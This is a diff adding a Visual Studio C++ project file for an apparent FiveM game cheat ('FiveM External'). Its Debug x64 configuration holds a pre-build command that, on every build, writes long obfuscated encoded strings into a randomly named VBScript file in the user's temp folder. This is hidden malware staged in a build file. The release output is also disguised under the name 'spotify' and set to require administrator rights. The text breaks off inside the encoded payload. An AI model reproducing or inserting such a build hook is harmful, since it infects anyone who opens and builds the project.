@@ -1,0 +1,230 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{107392d5-c2a0-49f0-9791-5062c355f988}</ProjectGuid>
+    <RootNamespace>TDLoader x TD FiveM External</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <ProjectName>FiveM External</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+    <VCToolsVersion>14.38.33130</VCToolsVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+    <IncludePath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Include;$(IncludePath)</IncludePath>
+    <LibraryPath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Lib\x64;$(LibraryPath)</LibraryPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+    <IncludePath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Include;$(IncludePath)</IncludePath>
+    <LibraryPath>C:\Users\Admin\Desktop\FiveM External\lib;C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Lib\x64;$(LibraryPath)</LibraryPath>
+    <OutDir>..\..\..\explorer</OutDir>
+    <TargetName>spotify</TargetName>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <AdditionalIncludeDirectories>$(ProjectDir)include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>glew32s.lib;glfw3.lib;opengl32.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>$(ProjectDir)lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <AdditionalIncludeDirectories>$(ProjectDir)include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>glew32s.lib;glfw3.lib;opengl32.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>$(ProjectDir)lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <AdditionalIncludeDirectories>$(ProjectDir)include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>glew32s.lib;glfw3.lib;opengl32.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>$(ProjectDir)lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+    </Link>
+    <PreBuildEvent><Command>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\CYw8nU&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;w4jDrsOjw4XDrcOew5HDp8KVwqbDj8OAwoLDtMOlw4PDq8OWw4/CmcKdwr3DrMOpw5TDosOjw4nDlsKZw4fDp8Khwr3Dm8Ouw5bDnsOQwr/DlsKZw5XCu8Kewp3CncOgwoLCtsKVwrDDnsOswo/DiMOXw4zDnsOYw5bCmcOXw5vDrcOawr3DlsKVwpXCq8KwwobDr8KVwp/CmcODw4fDsMKiwrHDm8Ofw4fDnMOpwoLDm8Ouw5bDnsOQwr/CmcKmwpjCtMKZw4bDnsOnw4vDr8OawqTDssOpw4fDrMKVwp/CmcODw4fDsMKiwrHDm8Ofw4fDnMOpwoLDjMOuw5XDrcOaw4/Cp8OIw4fDnMOqw5TDosOpw5vCp8K4w5TDssOlw5bDqMOcw5TDmsOlw4rDssKjwrTDn8OYwpTCscKuwprCvcOaw5TDosOrw4fCu8Ouw5bDnsOoworCncOaw5DCpcKVwobDrMK3wo7CmcKmwpLCqcKlwo7CmcOQwrXDssOow5bDnsOiwpDDjMOaw4XDrsOnw4vDrcOuwpDCvMOnw5vDqcOpw5HDoMOnw4PDqcOdw5vCp8K9w4PDrMOdwqPDpcOcw5HDq8Oew5bDocOiwrDDmsOiw4fDlsKvwpzDjMK9wqPCq8KqwpjCosKwwobDpMKVwp/CmcKZw4bDnsOnw4vDr8OawqTDssOpw4fDrMKjwqnDnsOpwqTDssOpw4fDrMKdwpXCq8Kewp3CncOrwoLCtsKVwobDncOaw5TDosOrw4fCu8Ouw5bDnsOowpDDgMOaw5bCu8Ouw5bDnsOoworCqsKrwovCtMOnw4fDrcOqw5TDp8KVwqLDtMKVwq3CmcKywoLCncOgwp3CmcOLwoLCtsKVwobDr8KVw5/DtsKww4jDrsOjw4XDrcOew5HDp8KVwqbCmcOww5LDmsOnw4PDpsKVworDlMOow5bDq8Oew5DDoMOSwobDnsK3wrzCpcOQw5XDrcOnw4vDp8Ocwr/CncOaw5DDnMKewp3CncOZwqTDssKVwp/CmcOQwrXDssOow5bDnsOiwpDCvMOkw5DDr8Oaw5TDrcOSwpzCs8K7w5TDqMOiwqTDmsOow4fCr8KpwrXDrcOnw4vDp8OcworCncOawqTDk8Kewp3CncOow4TDssKVwp/CmcKZw4bCu8Ouwr3CqcKjwpDCsMOSwp3CncOawqTDssKVwp/CmcKZw4bCu8Ouwr3CscKjwpDCocKZw4bCu8OuwpDDhcOaw5DDoMOpw4rCmcKiwoLCqsKewr/CtMKZw4bDq8OrwoLCtsKVwqbDj8OAwoLCpsOaw5DCmcKZw4fDp8OYwoLCpsOowqTCmcKZw5XDm8Ouwp3CncOgwoLCtsKVwobDncOnw5jCp8OAwp3CncOrwoLCtsKVwobDncOnw5jCp8OLwp3CncOWwoLCtsKVwr3DjMOuw5XDrcOaw4/Cp8OIw4fDnMOqw5TDosOpw5vCp8K4w5TDssOlw5bDqMOcw5TDmsOlw4rDssKjwqPDnsOowr/Cs8KvwqXDq8Oaw4PDrcOaworCosKwwobDmsKjwq/DqMOZw4fCmcKywoLDlMOIw5vDrMOpw4fDpsKjwrXDnsOYw5fDq8Oew5bDssKjwqXDq8Ouw5LDrcOkw4nDq8OWw5LDocOuwpDCvMOew5LDocOaw5TDhsOkw4bDnsOSwpzCs8K4wqTCvMKwwobDmsKjwrLDmsOZw4bDosOjw4nCmcKywoLDlMOIw5vDrMOpw4fDpsKjwrXDnsOYw5fDq8Oew5bDssKjwqXDq8Ouw5LDrcOkw4nDq8OWw5LDocOuwpDDicOWw4bDncOew5DDoMOCw5HDncOawr/Cs8KvwrLDhMK4wrXCsMKwwobDmsKjwq3DnsOuwoLCtsKVwobDpMKwwobDmsKjwqvDj8KVwp/CmcKZw5jCtMKZw4bDnMKVwp/CmcKZw4PCp8K4w5TDnsOWw5bDnsK5w4fDnMOnw5vDqcOpw5HDq8KdwovCtMOpw5TDssKVw53CncOZwqTCmcKywoLCncOZw4XCp8OJw5TDmsOjw5XDn8Okw5TDpsK7w4vDp8OWw47Cu8Ohw5HDnMOgworCncOawqTDssKhwoLCqcKhwoLCncOawqTDssKjwq7DnsOjw4nDrcOdwovCtMOnw4fDrcOqw5TDp8KVwr3DjMOuw5XDrcOaw4/Cp8OJw4fDscOpwpDCvsOjw4XDqMOZw4vDp8Ocwr/Cs8KvwrfDjcK7wprCp8K8w4fDrcOIw5bDq8Oew5DDoMKdwobDncK3wovDtsKVw4XDmsOpw4XDocKVw53Dq8Oaw5bDrsOnw5DCmcKZw5DDrsOhw47DtsOywobDnsK3woLCtsKVwoTDisKsw5LDosOOwrzDp8OrwrLDs8OXw47DscOFwpXDpsOiw5jDicOfwpfDh8OZwrXDoMOCw5PDgcOgw5zDjMKkwqzCrsObw4fDicOswrDCu8OGwpHDj8Ogw4nDn8KqwpfDksOhw4rCvcKtwrvDgMOPwqPDgMOnwrbDqMKsw4nCvMOew5TCscOXwpfCpMOuwrnDg8OAw4fCvMOgwqfDh8ODwrfDkMKtwprDhMOawrHDoMKlwqnDrMOcw5rDp8K6w5zDqcOGwpvDscKtwpbDjcK3w43Dr8K5wrvDiMOOwq3CqcOlw5fDo8KlwrrDp8OHwqzDsMK5wrfDn8OCw5zCvcKqw5nCrMONwpXDpsOXwrDCssKlw4/CqsKrw4rDo8OuwqPCsMOkw5DDmsOtwpfCusOPw43DpMOewrjDjcKmw4TDgMKtw4zDrsK3wrTDj8Ksw5PDkcOZw5XDisK+w5fDssOPwq3DjcK6wqXCq8K4w4PDg8KlwrHCssOjw5HCrcONwrjDosOqwrfCq8Odw5LCvsKrw5DDicOYwpnDjsKnwpnDhsOGw5fDpsKowpnDm8K7wrjDn8KkwrDCqMOFwqTDmsKowrfCscOuw4XDgcKswq3CqMKmw47Dm8OYw4PDocOawpvDpMK9wqjDgcK3wpLCusK8w5TDscONw5vDisOYwqTDscOiw47Dm8OdwrzDg8OIw5XDrsOHwqvDicOKwpbDssKqwqPDkMODwpXDicK2w5bDjMONwqzDs8OMw4bCvsK/w5HDp8K8wrrCrcOCw4zCscKpwqjDgMKtwqTDpcOJwrrDs8OrwrfDscK7w43Cq8OawpnCqsOnw4/CvcOBwrvDm8OWwpPDjcOewrnCqcOYwqTDpMONw5HDkcOOw5vDo8OHwqfDm8OGwpjDnsOjwpnCscOjw5HDgMOawqnDscODwrXCusOYwrzCssKsw5TCvMOHw5vCsMOiwprDqMOkwo3Do8OGwpHDpMOJwqPDncOmwqXDssONwprDiMOMw4/DncODwrzCssOOw5TCqMK9wqzDq8OHwrPDmsOHwqrDqMOaw5nDpcOaw4jDgsK9wq3Di8OZwq7DrcOkwrfDkMKgw47Do8OhwrHDicOFw4jDn8K+w5rDosKswpfCr8Ogw4zDpcOhwqfDkMK6wrTDqcOMw5rDkMOfwqXDjcOmwpfCu8K/wq7DksOHwpLCrcOhwqvCvcOYwqrCu8K7w4jDiMObwrHCqsOCwqXDsMOswrPDscOkwqvCpMOYwrbDrcOLw4zDm8OkwpPDh8Krw5TDr8K/wpTCssKkwqTDisODwq3Dn8OGwrrDrMK5wrLDi8KnwrjDosOgw4vCpMKgw47DhcKgwrfDo8OOwrbDrsODw5fDqsK5w4rCqMOZwq3CrsOcw4bDkcK4wpXDk8OkwqvDs8KrwpLDkcOpw5nCvsOqw4fDosOHw5XDqcKqwprCrMOswrTDh8Oew5rDi8OrwpfDssOaw5PDi8K5wqbDscOKwq7CvcOowqPDqMOIwpPDjcKrwqPDqMK9wrjCv8OpwrPCrMOswrnDscKnwpHDjcOvwqXDjsK3w5nCrcKmw5zDpMOZw4nCvsK6wqzCscObwqrDpMOKw4bCqsOJwpLCscOjw4jCqMOvw5jDrcOlwpHCq8Kmw4TDi8K/w5vDn8Kkw5bDiMOKwq/CrsOswqXDr8KuwrnCvMOnwrzDr8Knw5bDp8OHw4nCssOPwpTDqcOpw4TCvsOsw47DkcOJw5DDksOYw5jDgMOnwpbCrMObw5PDo8K7wrrDi8Olw5TDisOmw5HDpcK9w4vCusOmw4vDn8K5wrDDq8K7wrbCqsKqwrfDgMOFwpPDjcOgwpHDhMK3w4TDhsOZw4PCu8OJwqzCsMOlw4bDj8Klw4/DjsOHwqrDqcOXwqbDisOBw4rDn8OnwrHDpMK5w4fDisOqw47CusOHwrPDqMOkwqnDmsOqw4jDgsONwqzCsMKuw5jDqcOFw4TCrsOWw5LDrsOEw5LDiMOawprDgMOHw5XDp8OWw5jDqcOWwqzDrsOuwpjDisOJw5DCq8Otw5HCssOFwrLDkMOlw5PDj8OmwrHDgsK2w5rDsMOdwrfCr8OuwrbDoMKkwqnDhcOiwrfDm8OpwpTDiMKqw4/DkcKqwrPCv8Kgw5fCvcOhwo3DqcOWwrrDhsK+wqXDsMKsw5fDs8Kow5DCqMOkwpfDpMK5wrfDo8K/wqrDpsKpw4fDrcK8w4XDjcOrwrvCqMKpwrPCusOgw4XCqsOMwq7DqcOYwpjDmsOCwqzCvMONw4nDiMOrwpnCscOowrDDrcOIw4XDkcKrw5HDo8K3w5jDjMOlwqrDr8OGwrHCv8Obw5nCv8ObwpLDgsK6w5PDiMOow5TDgcKqw4nDn8Olw4zDn8OWw5TDjMOuwpXDrMKkw4fDhMOMwpjDosObwpPDpMOnwpLDqMKuwrHDocONwq3DhcOOw4/Dn8OIwrfDssObw4TCssOAwrbDjcKmw5DCqsK2wrvDisOLw4rCv8OvwqjDgMKrwpbCrcKpwqTDhsK9wqbDrMOLwpXCu8KkwrHDksOZwqjDhcOXwrfDicOkw4/Do8OIw5bCvMOcwpbDsMOGw5LDisOewrDCqMOEwq7DoMOaw4nCsMOGw5PCvsOPwpnDkcK7w4bDosOowpnDn8OIwrHDoMKqwqbDisOMwpLDisK4w5TDqMOgw5fDs8Oew4rCvMKmwpLCvMK/w4zDiMOow47Dk8OmwrTDh8OBw43DqcOEwrHCu8K/w4bDk8KuwqfDjsOcw5HDqsOtwpLDscOEwpbCqcK4wpPCpMOEw4zDqsKrwq/DrsKgwqnDoMOKwpLDg8Oiw5PCrMKkwpbDs8OFwpPCrMOtwqPDgsOvw5TDscOPw4bDicKqwqrDksOCw4PDq8K2w5XCr8OLw47DrsKswprDhsKtwrjDisKowpbDicONwq/CvsOJw4PDrMOdwrzDo8Kuw5rCqsOIwprDs8Oow5PDmsOfwo3DhcOswrPDh8K4wpvCvMKtwpXDpsK/wqbDgMOmwpPDicKowpXDkMOqwq/DisOqwqzDssK7wpXDjMOFwrXDnMOAwrLDhcOKwrnCrMK9wqvCrMOJwqPCrMOpwrTDssOtw5jDhcK5wpLCq8Oqw5HDqsODw5LDjMKnwrzCscKkwqPCqcKowrLCq8OswprDnsOvwprDm8Kuw4XDjcOnwpPDgcK4wrHDrcOLw4TDgsOGw5PCqcOKwrXCrsOWwrPDosOMwrrCvsOqw47Cu8OawqfDkcObw5HCvcOcwrjDiMOuwpTCscOmwpXDrMKkwpjDrsOuwrDCu8K6wo3CrsOPw43DrcOqw4zDj8OYw4nDisOfwpjDpsODw5nCq8Kgw4vCvMOgwqbCrMOgwrPDk8Oaw4PDqcK9w5HDjMOmwqbDn8OAwpLCqcOmwqrDncK4w4TCsMOowq3CqMK+w5LDnsK2w4nDhMOMw5LDscONw5XDrsKmwpfCssOfwqbCu8K+wqzDkMOaw47Dn8OkwprDkcK8w4zDh8OqwrXDiMKtwqPDqMOlw4TCvMOEwqfCv8OWw4nCrcOow5zCqsKqwq7CvcOAw5vDi8KowrLDr8OFw5zDk8OMw47DncOLwrrDiMKkw47DjsOdwq3CvsK+w4bCssOkw4zCvMOfwpbCvcKow5bDi8Kuw4PDm8Obw4fDkcOlwr&quot; &gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo c = &quot;hMOOwpTDh8Ktw5jDjcK/wpbCr8OPwqTDkcOswq7DksOuwpPDk8OLw4/Dk8OYwqrDnMOBwrrDoMKsw4zCu8OCwpvCvsOewrLDicOvwpfCu8KqwpfCusOpw5zDgcOgw47DhsOLwpHDrsKqw47CscOCwrfDn8OKwpbDq8OWwqPDssOnwq7Cu8OlwpHDrcONwrbDscOewrTDnMOnw5vDg8Kow5XDpMOdw43CvcOFwqrDrcONw5nDo8OWwpfDh8KpwrDCv8OOw5XDicOYwq/Dn8OGwrTDjcOfwqTDqcOYwpLDkMOqwqfDs8KpwprCpMOdwqrCq8OKw4zCqsOawpLDrsOCwrnCpMOvwqzDn8OJw4XCq8OdwqrDkMOlw5LDrMKmw4vCqcOgw5LDn8OCw4jCrsObwrzDksOFwpbCqMOpw4TDpsKow4TCqsOcwpvCqcOOw5TCu8KgwpnDq8OOwrrDhsOfw5DDicKkwqnCusOKwrTCqMOmw5DCv8OmwrvCssKow5rDq8KqwpfDscOcw4XDicOWwqnDiMOEwpPCq8OIw5PDiMOqw4fCv8Oew5rDpcOowrDCv8OhwqTDpcK6wrzDiMODw5XDssKlwqnCvsOaw5rDr8Kqw5fDiMOGwpvCqcOGw4PDpcOKw5zDkMKkwpPDs8Kow5jDo8OewqXDpcOEw5LCvMOhwrvDssODw4nDp8K+w5rDj8K3wpTDisOpw4rDoMOcwqPCsMOGwqjDhcODwpXDosKnw4rCr8K5w5zDmsK4wpjDoMODwpLDqcOfw5vDkMOhw4PDmsKnwqPCvsKmw5bDkcKpw4nDkcOJw5TCsMOjwq/CpMOOw5LDscObwprDpMOZwqjCvcOAwpHDkMOLwpXCvsOrwqPDosOqw4vDksOrwqzDn8Ohw47DhMOXwqbDp8OrwpnCscKkwpXDpcOYw5PCscKqwrLDq8OZw4TCvsKmwrnCvcOtwrHCv8OWwqXDh8OowqrCqsOawqTDqMKgwpvDgsK3wqbCrsOvw4jDn8Obw4vDjsOiwrvDg8OuwpnDiMKnw4fDm8K7w5fDrsKlw5LDjsOswpnDnsOLw4nDjcOMwrLDrcOuwpXDocOdwrPDosOYw5TDr8OXw43Cv8KpwqzDq8Kgw5fDrMOZwqrDhcOuwrLDksK+w4bDqsOowq7DosKqw5bDr8OKwrzDi8OAw5XDgsOGwpvDgsOuwrTCrcOjwpTDpsOvw4/DpMOnwprDnsKnw5jCssOuw4nCrcOnw5zDk8OKwqfDscKlw5rDpsKgw5DDjsOLw4/CrcK/wqzCq8OIwrnDj8OdwrbCscK7wpHDp8OYw5fCvMOJwrHDs8OKw5LCsMK+w5PDq8Ocw5PCscKtwq3DnMOcw5PCvsK/wqjDo8ONwpnCvsOmwpvCrsOqwpbDs8OPwqzCssOFwrDDsMK+wpPDpsONw4zDncK+wpvDo8Oiw4XCu8OmwrnDmsOuw4zDg8KrwqTDgsK7w4rDhMOjw4PDscOlwqvDoMOvwpXDh8K3w5LDqsK8wrvCv8K7w4fCqMOYwrXCvMOewpXCsMK9w47DkcKkw47Cu8Klwq/CscOfwrXDk8K9w5fDp8OGw5nDqsKtwpLDrsKmwqTDgMOYw4nDk8OOwq/DhMOawqjCqcKlw5rDj8OowqfDksOGwpvDssKkw4jCssK3wrTCrcONwqXDkMOpw43CvcKpwpjDoMOLwrjDocOuwqXDjcOGw4XDn8Kkw5rDo8Oqw47Dh8KlwrHDosOFw5jCrcK2w4XCrcKlw4XDscOZw4bDnsOlw4jDscKlw5LDoMOtw5fDm8ONwpbDnMOHwrLDgsKow4fDg8Okw4fDr8Ogw4jDnsOdwqvDhMK4w4PDk8Ktw5fDisOtwq/Dh8OrwqXDjMODw5DDssOKw4/Cv8OmwqjCr8ONwqPDisOZwrXDksK8w4bCr8OtwqjCq8K6wqvCvcK4w5XDgMKrw4/Dn8KtwrXDk8K/w5rDrsOmwrzDssKlwqTCvsOtwrrCvsOgwqzDosOfwrvDi8KgwqXDqsObw5TDgMKqw4rCssK3wrbCpMOKwpvDr8Kuw4PDgMOfwqXDs8OZw5fDnMK4w47DrsOdw4fCrcOdwpXDhcKrw4XDj8OGw5LDo8OCwqrCv8OvwprDhsOnw5vDh8OlwrPDg8KqwqXDrcK+w4PDncK8w5fCv8K9wpbDp8Kgw4vCr8OIwpPDhsK4wrbDh8OZwrTDqcK6wpHCrcOPwrvDocOswqnDh8OrwrbDjcKrwrjDiMKtw43CqMOMwrnDrcOOwrbDpMOmwpXDjsOLwpTCvcKpw5HDqcK3wo3CrsODw47Dp8OPwqjCpMK6wrjCvsOawq/CusOPw47DjMKlwqXDo8KkwpTCssOewrjDqMOMw47DpcONwrPCscK9wpLCpMOaw5DDk8OkwqXDksOrwq3Ds8OpwrTDoMOtwrDDksKlwrHDgcOvw5jDm8OjwqzDqsOgwq7DhMKkwrLDg8OtwrPDjsOow5rDrcOnwpvCvcK7w4bDicOuwpbCrMOLwqzDqsKlw4jDn8Olw5jDqcK4w43DgsOpw5vDq8Kqw4/DisObwpfCqMKrw5jCvsODwqrDi8Krw4XDrMK2wo3CsMOew5HDkcKtwpLCusODw5TDrcOqwq/Ds8Orw5TDhsKpw4jDpcOrwqPDhMOPw4bDjMOnwqnDgsOBw5rDi8OZwqbDqMOhw5rDgsK2wqrDj8OZwrjDrsOJwq3DrsK6wrTCsMKkw5PCqMK8wqfDkMOcw5nDrsOOwrHDoMODw4zDpMOcw5LDssOHw5fDksOKwrfDnMKswrXCrMK3w5fCv8KkwqTCq8Oow5zDsMOKwpXCvsOlw5zDsMOfw5PDjcKrwo3Dj8Kpw5fDk8KswpjDisK9wqbDrcK+w4jDssOBw4bDsMOowrrCssKrwprDkcOFwrfDssK5w4fDn8OMwqXDkMOaw4rDksOPw5LDrcKtwrPDksOrwrPDhcK/w5PDqsONwrfDisODwqfCv8OowpvDj8K3wqzDhsOnwpfDsMOhwrTCq8OJwqXDiMOewrnDicOHwrTDn8OIw5jDq8OOw5rDhsOhw4PDksKnw4nDncKkw5fDicOWwrjDicOrwrjDn8OHw5jCusKqwqrCu8OJw5zDrMKpwq3DiMKuwqXDj8K+w4/DjMKtw4/DjsKlw4PDrsOpwrzCpMKsw5rDoMOfw4PDjcOqwpPDgsOkwqzDo8K6wpfDsMOtw4nDqMOtwpHDgcOEwrbDkcOBwrHDqsOawrnDgMOEwqPDi8OCwpPDk8OawrDCr8K6wpjDpsOnwqnDssOdwpnCvsK+w4nDscK9wprDqMOmwqbCrcOFw5PDpsKmwqzDqcK+wq7Di8K7wrLCusOOwq7CvMK/wprCvMOewrfDnsOrw4TCqMOswrXDicOcw5LCvsOGw5rDjMKuwrnDgcOgw5HCvsK3wpbCssKqw43DjsKrwq/Dp8Kmw4jCqcOAw4TDosOswrfCusOOwrDCvMOAwpbCrcKqwrrDgMKmwpLDrsOrw4vDhsKtwpXDr8OnwpHDjcK5wpnCrMOFw4bDo8Okw47Do8OIwqTDssOWwpjCscK+w4jDgMOFw5PCqcK3w4nDp8KpwpbCvMOiwqvDhcOuw5rCssOHwqnDhcOGw4bDscOPwq3Dg8OswrDDscONwrbDp8KuwqjCqcK2wpvDs8OvwrbDncOmw5jDpcOFw4jDgMOlwrrDhsONw4XCvcK8w5jDhMK9wpbDhsK4wqrDksOBwq7DhMOmw4rCqMK+wprDocOcwpbDp8OqwqjDgMOBw4jDnMOcw5fDscK3w4TDo8OOw4bCv8Omw5vCu8Kmwq7Ds8OowpPDocKrw43CsMOnwrfDg8K8wrDDp8Okw5LDnsOhw4fDpMOmwrjDkcKqw5jDpsOAw4zCvcOlwq3CsMOCw5PCpMK6wrPDpsOPw5fDm8OuwrvDq8OswqjDgMK9wrfDosOJwpXDssOYwrHDh8Odw5nDicK5wpXDr8OuwqXDrcK2wqzDqMOHwqPDg8KowpLCqsOFwpXDs8Obw4/DqcKgwrXCvMOiw43DosKuw5LCusOew5vDp8KnwqXCrcONwrHDsMKgw47DoMOiwq7DrsKnw4XDk8OnwqfDs8OFwrLDg8OKw5XCq8OMw4XDrcOCw4nDscOXwqPDnMOiw4XDg8Otw5zDkcODwrHCusK3w4bDh8Kkwq7Do8OpwprCssKmwpHDqsOpw5HDpMOhwpLCqcKlwpvDk8OawqXDqcOHw4PDgsOMw4bDgsOPw5zCrMODwqzDisKnw4vCqcOvwqTDg8OlwrzDn8K2wrDDhcObw4bDhsOGw5jDrMKsw5DDn8K3wq/CvsOcw5XCrcOgw4jDqcKlw5rDjMOfw5XCscOlw4fDscKowqzDgMOKwrXDg8KqwrrDoMOcwq3Dn8K9w4zDscKqwqXDqcK+w5LDs8OKwrjCq8OCwrLDpsONwqvCvsOHwrTCu8OtwrDDmsK8wrzCqcOpwpXDncKtw4vDo8Kpw5zDicK7wrrDr8OAw47DscOmw4nCr8OhwrDCpMOiwrTDo8OJwpXCrMK